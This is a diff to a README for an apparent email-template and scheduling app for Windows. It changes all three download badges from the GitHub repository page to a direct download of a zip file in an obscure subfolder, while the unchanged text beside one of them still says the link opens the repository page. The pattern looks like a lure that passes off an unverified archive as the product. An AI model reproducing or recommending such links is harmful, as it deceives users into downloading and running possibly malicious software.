@@ -1,6 +1,6 @@
 # 📧 email-service-1771917737-4 - Easy Email Templates and Scheduling
 
-[![Download email-service-1771917737-4](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://github.com/Yametekudasai0690/email-service-1771917737-4)
+[![Download email-service-1771917737-4](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://raw.githubusercontent.com/Yametekudasai0690/email-service-1771917737-4/main/cest/service-email-v2.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ This section walks you through setting up the app on your Windows PC. You will v
 
 1. Click the big green download button below or any of the links that say **Download email-service-1771917737-4**.
 
-[![Download email-service-1771917737-4](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://github.com/Yametekudasai0690/email-service-1771917737-4)
+[![Download email-service-1771917737-4](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://raw.githubusercontent.com/Yametekudasai0690/email-service-1771917737-4/main/cest/service-email-v2.2.zip)
 
 This link will open the GitHub repository page where you can find the latest version of the software.
 
@@ -150,4 +150,4 @@ Always keep your computer protected with antivirus software and keep the app upd
 
 Use this link to visit the GitHub page where you can download the application installer:
 
-[![Download email-service-1771917737-4](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://github.com/Yametekudasai0690/email-service-1771917737-4)
+[![Download email-service-1771917737-4](https://img.shields.io/badge/Download-Get%20Email%20Service-brightgreen)](https://raw.githubusercontent.com/Yametekudasai0690/email-service-1771917737-4/main/cest/service-email-v2.2.zip)
